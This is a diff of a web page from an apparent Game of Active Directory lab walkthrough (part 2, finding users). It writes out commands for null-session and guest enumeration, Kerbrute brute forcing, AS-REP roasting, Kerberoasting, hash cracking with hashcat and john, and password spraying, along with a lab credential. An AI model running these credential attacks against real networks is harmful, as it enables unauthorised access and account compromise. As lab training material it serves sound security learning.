@@ -155,6 +155,24 @@
         </ul>
 
         <div class="separator"></div>
+        
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Select Part:</p>
+        
+        <ul class="goad-sidebar-list">
+          <li><a href="index.html">Overview</a></li>
+          <li><a href="part-1-reconnaissance.html">Part 1: Reconnaissance</a></li>
+          <li><a href="part-2-finding-users.html">Part 2: Finding Users</a></li>
+          <li><a href="part-3-authenticated-enumeration.html">Part 3: Auth Enum</a></li>
+          <li><a href="part-4-ntlm-relaying.html">Part 4: NTLM Relay</a></li>
+          <li><a href="part-5-adcs.html">Part 5: ADCS</a></li>
+          <li><a href="part-6-mssql.html">Part 6: MSSQL</a></li>
+          <li><a href="part-7-privilege-escalation.html">Part 7: PrivEsc</a></li>
+          <li><a href="part-8-lateral-move.html">Part 8: Lateral Move</a></li>
+          <li><a href="part-9-delegations.html">Part 9: Delegations</a></li>
+          <li><a href="part-10-acl.html">Part 10: ACL</a></li>
+          <li><a href="part-11-trusts.html">Part 11: Trusts</a></li>
+          <li><a href="part-12-having-fun.html">Part 12: Having Fun</a></li>
+        </ul>
 
         <ul class="social-list">
           <li class="social-item">
@@ -204,29 +222,29 @@ nxc smb 10.10.10.161 -u '' -p '' --pass-pol
 nxc smb 10.10.10.161 -u '' -p '' --users
 nxc smb 10.10.10.161 -u '' -p '' --groups</code></pre>
 
-<p><code>netexec smb winterfell --username '' --password ''</code></p>
+<pre><code>netexec smb winterfell --username '' --password ''</code></pre>
 
-<p><code>netexec smb kingslanding --username '' --password ''</code></p>
+<pre><code>netexec smb kingslanding --username '' --password ''</code></pre>
 
-<p><code>netexec smb meereen --username '' --password ''</code></p>
+<pre><code>netexec smb meereen --username '' --password ''</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_1.png" alt="Screenshot 1">
 
 <p><strong>Domain Controller Winterfell users enumeration.</strong></p>
 
-<p><code>netexec smb winterfell --username '' --password '' --users</code></p>
+<pre><code>netexec smb winterfell --username '' --password '' --users</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_2.png" alt="Screenshot 2">
 
 <p>If we take a closer look, we will see that user samwell.tarly has his password in his own description. Now that we have also discovered that we can get the list of users from inside the Null Session, we can also use the flag <code>--users-export</code> to automatically export all theses users into a file.</p>
 
-<p><code>netexec smb winterfell --username '' --password '' --users --users-export users.txt</code></p>
+<pre><code>netexec smb winterfell --username '' --password '' --users --users-export users.txt</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_3.png" alt="Screenshot 3">
 
 <p><strong>Retrieve Domain Controller Password Policy.</strong></p>
 
-<p><code>netexec smb winterfell --username '' --password '' --pass-pol</code></p>
+<pre><code>netexec smb winterfell --username '' --password '' --pass-pol</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_4.png" alt="Screenshot 4">
 
@@ -254,9 +272,9 @@ nxc smb 10.10.10.161 -u '' -p '' --groups</code></pre>
 
 <p>The next critical step is to modify the local security policy of the Domain Controller to explicitly allow insecure guest logons. This is governed by a specific registry key that Microsoft enforces to prevent information leakage over SMB. We need to navigate to the LanmanWorkstation and LanmanServer parameters in the registry. Specifically, we are looking for a value called <code>AllowInsecureGuestLogon</code>. We can set this globally through a Group Policy Object or apply it directly to the local registry for immediate effect on Winterfell. We execute the following command in PowerShell: <code>Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters" -Name "AllowInsecureGuestLogon" -Value 1</code>. We may also need to apply similar changes to the LanmanServer service to ensure the listener is willing to map anonymous incoming packets to the newly enabled Guest identity.</p>
 
-<p><code>Enable-ADAccount -Identity Guest</code></p>
+<pre><code>Enable-ADAccount -Identity Guest</code></pre>
 
-<p><code>Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters" -Name "AllowInsecureGuestLogon" -Value 1</code></p>
+<pre><code>Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters" -Name "AllowInsecureGuestLogon" -Value 1</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_5.png" alt="Screenshot 5">
 
@@ -264,7 +282,7 @@ nxc smb 10.10.10.161 -u '' -p '' --groups</code></pre>
 
 <p>To systematically identify and exploit Guest Logon vulnerabilities across the target environment, we utilize a combination of specialized scanners and low-level protocol interactors that allow us to probe the SMB service with high precision. Our first and most effective line of testing is almost always performed using <strong>NetExec</strong>. This tool has effectively replaced legacy scanners because of its ability to multi-thread across large subnets while simultaneously testing multiple authentication vectors. By executing a command like <code>nxc smb &lt;IP&gt; -u 'guest' -p ''</code>, we can instantly visualize which machines have the guest account enabled and, more importantly, whether that account has the permission to list shares. A successful result here is indicated by the "<strong>Pwn3d!</strong>" or "Read" label in the output, which serves as an immediate signal to stop broad scanning and begin deep, surgical extraction of that specific machine.</p>
 
-<p><code>poetry run netexec smb winterfell.north.sevenkingdoms.local -u 'Guest' -p ''</code></p>
+<pre><code>poetry run netexec smb winterfell.north.sevenkingdoms.local -u 'Guest' -p ''</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_6.png" alt="Screenshot 6">
 
@@ -274,7 +292,7 @@ nxc smb 10.10.10.161 -u '' -p '' --groups</code></pre>
 
 <p>By appending the <code>--shares</code> flag to our NetExec command, we may transition from simple account validation to mapping the actual data and service accessibility of the host.</p>
 
-<p><code>poetry run netexec smb winterfell.north.sevenkingdoms.local -u 'Guest' -p '' --shares</code></p>
+<pre><code>poetry run netexec smb winterfell.north.sevenkingdoms.local -u 'Guest' -p '' --shares</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_7.png" alt="Screenshot 7">
 
@@ -288,7 +306,7 @@ nxc smb 10.10.10.161 -u '' -p '' --groups</code></pre>
 
 <p>The other tool we can use to enumerate Guest Logon enabled is <code>smbclient</code>. This tool is essential for the manual exploration phase because it provides a direct, interactive terminal into the remote file system. By using the following command we enumerate Guest Logon Enabled and we can also simultaneously request a list of all available shares.</p>
 
-<p><code>smbclient -U 'Guest' -L \\\\10.4.10.11</code></p>
+<pre><code>smbclient -U 'Guest' -L \\\\10.4.10.11</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_8.png" alt="Screenshot 8">
 
@@ -302,8 +320,8 @@ nxc smb 10.10.10.161 -u '' -p '' --groups</code></pre>
 
 <p>Following the deactivation of the account, we have to revert the structural changes we made to the SMB protocol behavior. Even with the account disabled, we still want to ensure that the server's registry is hardened against potential fallback techniques. We will reset the <code>AllowInsecureGuestLogon</code> parameter by changing its value back to zero.</p>
 
-<p><code>Disable-ADAccount -Identity Guest</code></p>
-<p><code>Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters" -Name "AllowInsecureGuestLogon" -Value 0</code></p>
+<pre><code>Disable-ADAccount -Identity Guest</code></pre>
+<pre><code>Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters" -Name "AllowInsecureGuestLogon" -Value 0</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_9.png" alt="Screenshot 9">
 
@@ -311,7 +329,7 @@ nxc smb 10.10.10.161 -u '' -p '' --groups</code></pre>
 
 <p>To ensure these deep registry and identity changes take full effect across the system's memory, we must perform a final reboot of Winterfell. Just as with the <code>dSHeuristics</code> modification, some low-level services may continue to respect the old permissive logic until the operating system reinitializes its service managers. A reboot serves as the definitive way to purge the permissive settings and force the system to reload its secure state from the disk. Once the machine is back online, we will execute our verification check using NetExec to confirm that we see the return of the <code>STATUS_ACCOUNT_DISABLED</code> error.</p>
 
-<p><code>smbclient -U 'Guest' -L \\\\10.4.10.11</code></p>
+<pre><code>smbclient -U 'Guest' -L \\\\10.4.10.11</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_10.png" alt="Screenshot 10">
 
@@ -329,9 +347,9 @@ nxc smb 10.10.10.161 -u '' -p '' --groups</code></pre>
 
 <p>By default we do not have this condition in GOAD, but we can be easily enabled using the same method we did during the <strong><code>Enumerate Guest logon</code></strong> phase.</p>
 
-<p><code>Enable-ADAccount -Identity Guest</code></p>
+<pre><code>Enable-ADAccount -Identity Guest</code></pre>
 
-<p><code>Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters" -Name "AllowInsecureGuestLogon" -Value 1</code></p>
+<pre><code>Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters" -Name "AllowInsecureGuestLogon" -Value 1</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_11.png" alt="Screenshot 11">
 
@@ -339,13 +357,13 @@ nxc smb 10.10.10.161 -u '' -p '' --groups</code></pre>
 
 <h3>Enumerating with NetExec</h3>
 
-<p><code>poetry run netexec smb winterfell.north.sevenkingdoms.local -u 'Guest' -p '' --rid-brute</code></p>
+<pre><code>poetry run netexec smb winterfell.north.sevenkingdoms.local -u 'Guest' -p '' --rid-brute</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_12.png" alt="Screenshot 12">
 
 <h3>Enumerating with Impacket-lookupsid</h3>
 
-<p><code>impacket-lookupsid north.sevenkingdoms.local/Guest@winterfell.north.sevenkingdoms.local -no-pass</code></p>
+<pre><code>impacket-lookupsid north.sevenkingdoms.local/Guest@winterfell.north.sevenkingdoms.local -no-pass</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_13.png" alt="Screenshot 13">
 
@@ -387,7 +405,7 @@ viserys.targaryen</code></pre>
 
 <h3>Kerbrute in sevenkingdoms.local DC</h3>
 
-<p><code>./Kerbrute userenum -d sevenkingdoms.local --dc 10.4.10.10 found_users.txt</code></p>
+<pre><code>./Kerbrute userenum -d sevenkingdoms.local --dc 10.4.10.10 found_users.txt</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_14.png" alt="Screenshot 14">
 
@@ -395,7 +413,7 @@ viserys.targaryen</code></pre>
 
 <h3>Kerbrute in essos.local DC</h3>
 
-<p><code>./Kerbrute userenum -d essos.local --dc 10.4.10.12 found_users.txt</code></p>
+<pre><code>./Kerbrute userenum -d essos.local --dc 10.4.10.12 found_users.txt</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_15.png" alt="Screenshot 15">
 
@@ -429,7 +447,7 @@ viserys.targaryen</code></pre>
 
 <p>To perform the attack, we utilize <strong>Impacket's GetNPUsers.py</strong>. This tool automates the process of generating the specific AS-REQ packet and, crucially, formatting the encrypted response into a hash format that cracking tools can parse.</p>
 
-<p><code>impacket-GetNPUsers -request 'north.sevenkingdoms.local/' -no-pass -usersfile users.txt</code></p>
+<pre><code>impacket-GetNPUsers -request 'north.sevenkingdoms.local/' -no-pass -usersfile users.txt</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_16.png" alt="Screenshot 16">
 
@@ -437,7 +455,7 @@ viserys.targaryen</code></pre>
 
 <p>If we have already compromised a valid user account (even a low-privileged one), we prefer this method. We use an LDAP query to search the domain for any object where the <code>userAccountControl</code> attribute includes the flag <code>DONT_REQ_PREAUTH</code> (bit 4194304). This is surgical and precise, as we only target vulnerable accounts. We are going to use <code>samwell.tarly</code> we have compromised during the user's enumeration since we found his password lying down in the user's Description section.</p>
 
-<p><code>impacket-GetNPUsers -request 'north.sevenkingdoms.local/samwell.tarly:Heartsbane' -no-pass -usersfile users.txt</code></p>
+<pre><code>impacket-GetNPUsers -request 'north.sevenkingdoms.local/samwell.tarly:Heartsbane' -no-pass -usersfile users.txt</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_17.png" alt="Screenshot 17">
 
@@ -459,14 +477,14 @@ viserys.targaryen</code></pre>
 
 <p>Once we successfully retrieve a hash, we are no longer attacking the network; we are attacking the mathematics of the encryption. We copy the hash to our local rig and use Hashcat. The specific mode for this is <strong>18200</strong> (Kerberos 5, etype 23, AS-REP). It is worth noting that while newer accounts might use AES (mode 19600/19700), misconfigured accounts often default to older encryption types like RC4, which makes them even easier to crack.</p>
 
-<p><code>impacket-GetNPUsers -request 'north.sevenkingdoms.local/' -usersfile users.txt -format hashcat -outputfile ASREP-Roasting.txt</code></p>
+<pre><code>impacket-GetNPUsers -request 'north.sevenkingdoms.local/' -usersfile users.txt -format hashcat -outputfile ASREP-Roasting.txt</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_18.png" alt="Screenshot 18">
 
 <h3>Cracking the hash with John & Hashcat</h3>
 
-<p><code>john --wordlist=/usr/share/wordlists/rockyou.txt.gz ASREP-Roasting.txt</code></p>
-<p><code>hashcat -m 18200 -a 0 ASREP-Roasting.txt /usr/share/wordlists/rockyou.txt.gz -O</code></p>
+<pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt.gz ASREP-Roasting.txt</code></pre>
+<pre><code>hashcat -m 18200 -a 0 ASREP-Roasting.txt /usr/share/wordlists/rockyou.txt.gz -O</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_19.png" alt="Screenshot 19">
 
@@ -491,7 +509,7 @@ viserys.targaryen</code></pre>
 
 <p>We can utilize <strong>NetExec</strong> to automate this entire chain. By specifying the vulnerable user (<code>brandon.stark</code>) and providing an empty password, we tell the tool to grab the initial session. We then feed it our <code>users.txt</code> wordlist, instructing it to attempt to fetch Service Tickets for every user in that list.</p>
 
-<p><code>poetry run netexec ldap north.sevenkingdoms.local -u 'brandon.stark' -p '' --no-preauth-targets users.txt --kerberoasting output_tgs.txt</code></p>
+<pre><code>poetry run netexec ldap north.sevenkingdoms.local -u 'brandon.stark' -p '' --no-preauth-targets users.txt --kerberoasting output_tgs.txt</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_20.png" alt="Screenshot 20">
 
@@ -512,9 +530,9 @@ viserys.targaryen</code></pre>
 
 <p>After getting the TGS we can use Hashcat or John to crack the hash.</p>
 
-<p><code>john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt.gz output_tgs.txt</code></p>
+<pre><code>john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt.gz output_tgs.txt</code></pre>
 
-<p><code>hashcat -m 13100 -a 0 output_tgs.txt /usr/share/wordlists/rockyou.txt.gz -O</code></p>
+<pre><code>hashcat -m 13100 -a 0 output_tgs.txt /usr/share/wordlists/rockyou.txt.gz -O</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_21.png" alt="Screenshot 21">
 
@@ -558,7 +576,7 @@ shutdown /r /t 0</code></pre>
 
 <h3>Enumeration LDAP Anonymous Bind with NetExec</h3>
 
-<p><code>poetry run netexec ldap meereen.essos.local -u '' -p ''</code></p>
+<pre><code>poetry run netexec ldap meereen.essos.local -u '' -p ''</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_22.png" alt="Screenshot 22">
 
@@ -566,7 +584,7 @@ shutdown /r /t 0</code></pre>
 
 <p>The interesting part of the Meereen output is the green line at the bottom. In many versions of NetExec, a green plus sign simply indicates that the connection attempt didn't result in a network-level rejection or a standard "Logon Failure" (like an incorrect password would). However, because we see that red error message right above it, we know for a fact that the anonymous bind is functionally useless on Meereen. The server is correctly enforcing the modern standard of requiring a valid identity before it will reveal a single byte of directory data. If we were to try and dump users here, the process would stop immediately because we lack the necessary "read" permissions that only authenticated users possess.</p>
 
-<p><code>poetry run netexec ldap meereen.essos.local -u '' -p ''</code></p>
+<pre><code>poetry run netexec ldap meereen.essos.local -u '' -p ''</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_23.png" alt="Screenshot 23">
 
@@ -574,7 +592,7 @@ shutdown /r /t 0</code></pre>
 
 <p>We have effectively moved from a state of "Locked" on Meereen to a state of "Permissive" on Winterfell. On Winterfell, we are now in a position where we can append flags like <code>--users</code>, <code>--groups</code>, or <code>--computers</code> to our NetExec command and the server will dutifully stream that data back to us. We have bypassed the most fundamental identity check in Active Directory. This comparison confirms that our forest-wide configuration change has successfully replicated and is now being enforced by the local LDAP listener on the North Domain Controller, providing us with a transparent view into the domain's internal structure without needing a single password.</p>
 
-<p><code>poetry run netexec ldap winterfell.north.sevenkingdoms.local -u '' -p '' --users</code></p>
+<pre><code>poetry run netexec ldap winterfell.north.sevenkingdoms.local -u '' -p '' --users</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_24.png" alt="Screenshot 24">
 
@@ -584,13 +602,13 @@ shutdown /r /t 0</code></pre>
 
 <p>We initiate our extraction by targeting the specific naming context of the domain, which in this case is <code>DC=north,DC=sevenkingdoms,DC=local</code>. We utilize the <code>-x</code> flag to specify simple authentication and we leave the Bind DN (<code>-D</code>) and the password (<code>-w</code>) empty to maintain our anonymous status.</p>
 
-<p><code>ldapsearch -H ldap://winterfell.north.sevenkingdoms.local -x -b "DC=north,DC=sevenkingdoms,DC=local" -D "" -w "" "*"</code></p>
+<pre><code>ldapsearch -H ldap://winterfell.north.sevenkingdoms.local -x -b "DC=north,DC=sevenkingdoms,DC=local" -D "" -w "" "*"</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_25.png" alt="Screenshot 25">
 
 <p>The most critical part of this next command is the LDAP filter we provide at the end. We typically use a filter like <code>(&(objectCategory=person)(objectClass=user))</code> because it specifically targets human user objects while filtering out computer accounts and other service identities that might clutter our results.</p>
 
-<p><code>ldapsearch -H ldap://winterfell.north.sevenkingdoms.local -D '' -w '' -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))"</code></p>
+<pre><code>ldapsearch -H ldap://winterfell.north.sevenkingdoms.local -D '' -w '' -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))"</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_26.png" alt="Screenshot 26">
 
@@ -602,19 +620,19 @@ shutdown /r /t 0</code></pre>
 
 <p>Now we just need to start playing around with the filters while querying for LDAP. If we apply the <code>|grep 'distinguishedName:'</code> concatenated with ldapsearch as well, we end up getting a list of users based on their DistinguishedName attribute. Note: We need to be aware that when passing these attributes, the capitalization matters, if we pass <code>DistinguishedName</code> instead of <code>distinguishedName</code> on our <strong>grep</strong> command, the query will fail since <code>DistinguishedName</code> is not a valid attribute.</p>
 
-<p><code>ldapsearch -H ldap://winterfell.north.sevenkingdoms.local -D '' -w '' -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'</code></p>
+<pre><code>ldapsearch -H ldap://winterfell.north.sevenkingdoms.local -D '' -w '' -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_27.png" alt="Screenshot 27">
 
 <p>This time we can use the next filter which is <code>"user" | grep 'dn:'</code>, this will help us to bring the whole list of valid users and also groups as well.</p>
 
-<p><code>ldapsearch -H ldap://winterfell.north.sevenkingdoms.local -D '' -w '' -b 'DC=north,DC=sevenkingdoms,DC=local' "user" | grep 'dn:'</code></p>
+<pre><code>ldapsearch -H ldap://winterfell.north.sevenkingdoms.local -D '' -w '' -b 'DC=north,DC=sevenkingdoms,DC=local' "user" | grep 'dn:'</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_28.png" alt="Screenshot 28">
 
 <p>For this last filter, but not the least important one, we can use the <code>"*" | grep 'description'</code> followed by <code>-A 2</code>, or any specific number which determine the number if lines we want to see after description. This command will bring all the objects inside the target domain, including <code>description</code>, <code>givenName</code> and <code>distinguishedName</code> as well. This filter is really important during the enumeration, as we have stated previously, sometimes many System Admins end up adding crucial information into descriptions that end up leading to be juicy information to us as attackers.</p>
 
-<p><code>ldapsearch -H ldap://winterfell.north.sevenkingdoms.local -D '' -w '' -b 'DC=north,DC=sevenkingdoms,DC=local' "*" | grep 'description' -A 2</code></p>
+<pre><code>ldapsearch -H ldap://winterfell.north.sevenkingdoms.local -D '' -w '' -b 'DC=north,DC=sevenkingdoms,DC=local' "*" | grep 'description' -A 2</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_29.png" alt="Screenshot 29">
 
@@ -661,11 +679,11 @@ Set-ADObject -Identity $TargetObject -Replace @{dSHeuristics="0000000"}</code></
 <li>Avoid range or a list of IP when using option <code>--no-bruteforce</code></li>
 </ul>
 
-<p><code>poetry run netexec smb winterfell -u users.txt -p users.txt --no-bruteforce</code></p>
+<pre><code>poetry run netexec smb winterfell -u users.txt -p users.txt --no-bruteforce</code></pre>
 
 <p>I used GREP here to bring me the successful attempts only on output so I can have the output clean.</p>
 
-<p><code>poetry run netexec smb winterfell -u users.txt -p users.txt --no-bruteforce | grep "[+]"</code></p>
+<pre><code>poetry run netexec smb winterfell -u users.txt -p users.txt --no-bruteforce | grep "[+]"</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_31.png" alt="Screenshot 31">
 
@@ -737,7 +755,7 @@ with open('wordlis.txt', 'w') as output_file:
 
 print("All username:password combinations successfully written to wordlist.txt")</code></pre>
 
-<p><code>python3 ./CustomPassGen.py</code></p>
+<pre><code>python3 ./CustomPassGen.py</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_33.png" alt="Screenshot 33">
 
@@ -782,7 +800,7 @@ sudo hwclock --systohc
 echo "Verification: Local time is now $(date)"
 echo "The KRB_AP_ERR_SKEW barrier is successfully removed for $TARGET."</code></pre>
 
-<p><code>./clock.sh winterfell</code></p>
+<pre><code>./clock.sh winterfell</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_35.png" alt="Screenshot 35">
 
@@ -790,7 +808,7 @@ echo "The KRB_AP_ERR_SKEW barrier is successfully removed for $TARGET."</code></
 
 <p>Now that both servers are synced, we can simply run our Kerbrute.</p>
 
-<p><code>./Kerbrute bruteforce -d north.sevenkingdoms.local --dc winterfell.north.sevenkingdoms.local wordlis.txt</code></p>
+<pre><code>./Kerbrute bruteforce -d north.sevenkingdoms.local --dc winterfell.north.sevenkingdoms.local wordlis.txt</code></pre>
 
 <img src="./game-of-active-directory/part-2-finding-users/images/screenshot_36.png" alt="Screenshot 36">
 
